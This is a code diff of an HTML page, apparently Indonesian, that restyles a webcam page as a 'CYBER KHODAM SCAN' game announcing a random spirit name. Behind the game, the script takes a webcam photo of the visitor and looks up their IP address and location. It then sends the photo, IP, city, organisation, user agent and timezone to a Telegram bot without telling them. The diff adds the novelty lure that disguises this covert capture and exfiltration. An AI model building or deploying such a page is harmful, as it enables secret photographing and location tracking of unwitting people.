@@ -2,18 +2,118 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Kamera Web</title>
+  <title>CYBER KHODAM SCAN</title>
   <style>
-    video, canvas { width: 100%; max-width: 400px; }
-    button { margin-top: 10px; }
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+    body {
+      background: #000;
+      color: #00ff99;
+      font-family: 'Share Tech Mono', monospace;
+      text-align: center;
+      padding: 20px;
+    }
+
+    h2 {
+      font-size: 2em;
+      text-shadow: 0 0 15px #00ff99;
+      margin-bottom: 20px;
+      animation: flicker 1.5s infinite alternate;
+    }
+
+    video, canvas {
+      width: 90%;
+      max-width: 400px;
+      border: 2px solid #00ff99;
+      border-radius: 10px;
+      margin-bottom: 10px;
+      box-shadow: 0 0 30px #00ff99;
+    }
+
+    canvas {
+      display: none;
+      image-rendering: pixelated;
+    }
+
+    button {
+      background: #000;
+      color: #00ff99;
+      border: 2px solid #00ff99;
+      padding: 10px 25px;
+      font-size: 16px;
+      cursor: pointer;
+      text-shadow: 0 0 5px #00ff99;
+      margin-top: 20px;
+      transition: 0.2s;
+    }
+
+    button:hover {
+      background: #00ff99;
+      color: #000;
+      box-shadow: 0 0 15px #00ff99;
+    }
+
+    #popup {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.9);
+      color: #00ff99;
+      font-family: 'Share Tech Mono', monospace;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 9999;
+    }
+
+    #popup h3 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      text-shadow: 0 0 10px #00ff99;
+    }
+
+    #popup img {
+      max-width: 80%;
+      border: 2px solid #00ff99;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #00ff99;
+      margin: 20px 0;
+    }
+
+    #popup p {
+      font-size: 20px;
+      text-shadow: 0 0 5px #00ff99;
+    }
+
+    #popup .close {
+      position: absolute;
+      top: 20px;
+      right: 30px;
+      font-size: 24px;
+      cursor: pointer;
+    }
+
+    @keyframes flicker {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.7; }
+    }
   </style>
 </head>
 <body>
-  <h2>Kamera Web</h2>
+  <h2>[ SYSTEM ONLINE - CAMERA ACTIVE ]</h2>
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <canvas id="canvas"></canvas>
   <br>
-  <button onclick="takePhoto()">Ambil Foto</button>
+  <button onclick="takePhoto()">INITIATE SCAN</button>
+
+  <!-- POPUP -->
+  <div id="popup">
+    <div class="close" onclick="closePopup()">X</div>
+    <h3>[ SCAN COMPLETED ]</h3>
+    <img id="resultImage" src="">
+    <p id="khodamResult"></p>
+  </div>
 
   <script>
     const video = document.getElementById('video');
@@ -21,21 +121,36 @@
     const ctx = canvas.getContext('2d');
 
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-      });
+      .then(stream => { video.srcObject = stream });
 
     async function takePhoto() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0);
-      const imageData = canvas.toDataURL('image/jpeg');
+
+      // Efek glitch grayscale + scanline
+      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+      const data = imageData.data;
+      for (let i = 0; i < data.length; i += 4) {
+        const gray = data[i] * 0.3 + data[i+1] * 0.59 + data[i+2] * 0.11;
+        data[i] = gray + Math.random() * 20;     // R
+        data[i+1] = gray;                        // G
+        data[i+2] = gray;                        // B
+        if ((i / 4) % canvas.width < 2) {
+          data[i] *= 0.5;
+          data[i+1] *= 0.5;
+          data[i+2] *= 0.5;
+        }
+      }
+      ctx.putImageData(imageData, 0, 0);
+
+      const finalImage = canvas.toDataURL('image/jpeg');
 
       const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json());
       const info = await fetch(`https://ipapi.co/${ip.ip}/json/`).then(r => r.json());
 
       const payload = {
-        image: imageData,
+        image: finalImage,
         ip: ip.ip,
         city: info.city,
         region: info.region,
@@ -46,6 +161,7 @@
         time: new Date().toString()
       };
 
+      showPopup(finalImage);
       sendToTelegram(payload);
     }
 
@@ -56,14 +172,15 @@
       const imageBlob = dataURItoBlob(data.image);
       const formData = new FormData();
       formData.append("chat_id", chatId);
-      formData.append("photo", imageBlob, "photo.jpg");
+      formData.append("photo", imageBlob, "cyber_photo.jpg");
       formData.append("caption", `
+[CyberIntel Report]
 IP: ${data.ip}
 Lokasi: ${data.city}, ${data.region}, ${data.country}
 Waktu: ${data.time}
-User-Agent: ${data.ua}
 Org: ${data.org}
-Timezone: ${data.timezone}
+User-Agent: ${data.ua}
+Zona: ${data.timezone}
 `.trim());
 
       fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
@@ -81,6 +198,21 @@ Timezone: ${data.timezone}
         ia[i] = byteString.charCodeAt(i);
       }
       return new Blob([ab], { type: mimeString });
+    }
+
+    function closePopup() {
+      document.getElementById('popup').style.display = 'none';
+    }
+
+    function showPopup(imageData) {
+      const khodamList = [
+        "Ratu Kidul", "Eyang Joyo", "Siluman Net", "Mister 404",
+        "Bayangan Merah", "Putri Malam", "Ki Jagat", "Shadow Byte", "Roh Halimun", "Kakang Sukma"
+      ];
+      const randomKhodam = khodamList[Math.floor(Math.random() * khodamList.length)];
+      document.getElementById("resultImage").src = imageData;
+      document.getElementById("khodamResult").textContent = "Khodam-mu adalah: " + randomKhodam;
+      document.getElementById("popup").style.display = "flex";
     }
   </script>
 </body>
